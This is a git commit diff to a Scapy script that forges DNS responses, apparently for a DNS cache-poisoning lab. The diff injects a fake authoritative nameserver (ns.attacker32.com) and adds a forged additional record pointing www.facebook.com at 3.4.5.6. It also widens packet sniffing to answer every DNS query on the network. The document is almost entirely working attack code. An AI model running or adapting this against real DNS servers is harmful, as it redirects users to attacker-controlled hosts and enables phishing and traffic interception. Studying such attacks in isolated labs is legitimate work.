76a5c6eb5fdbc2ac6ac0369668f426ae098ac78d
LennyAtomz138 <LennyAtomz138@github.com>
2021-03-06 21:22:22 -0500

    wip: adding updates for spoofaddsection.py

--- local/spoofaddsection.py
+++ local/spoofaddsection.py
@@ -25,20 +25,24 @@ def spoof_authdns(pkt):
      NSsec2  = DNSRR(rrname="google.com", type="NS",
                     rdata="ns.attacker32.com", ttl=260000)
 
-     # Additional Section for 1.2.3.4
+     # Additional Section for attacker32.com:1.2.3.4
      AddSec1 = DNSRR(rrname="attacker32.com", type="A",
                      rdata='1.2.3.4', ttl=259200)
 
-     # Additional Section for 5.6.7.8
-     AddSec2 = DNSRR(rrname="attacker32.com", type="A",
+     # Additional Section for ns.example.net:5.6.7.8
+     AddSec2 = DNSRR(rrname="ns.example.net", type="A",
                      rdata='5.6.7.8', ttl=259200)
+
+     # Additional Section for www.facebook.com:3.4.5.6
+     AddSec3 = DNSRR(rrname="www.facebook.com", type="A",
+                     rdata='3.4.5.6', ttl=259200)     
 
      # Construct DNS Response packet for example.net
      DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd,
                   aa=1,rd=0,qr=1,qdcount=1,ancount=1,
-                  nscount=2,arcount=2,
+                  nscount=2,arcount=3,
                   an=AnsSec,ns=NSsec1/NSsec2,
-                  ar=AddSec1/AddSec2)
+                  ar=AddSec1/AddSec2/AddSec3)
 
      # Concatentate respective packet segments
      spoofpkt = IPpkt/UDPpkt/DNSpkt
@@ -48,5 +52,4 @@ def spoof_authdns(pkt):
      #send(spoofpkt2)
 
 # Target the local DNS server (Machine B) with the sniffer
-pkt=sniff(filter="udp and (src host 10.0.2.5 and dst port 53)",
-          prn=spoof_authdns)
+pkt=sniff(filter="udp and dst port 53",prn=spoof_authdns)
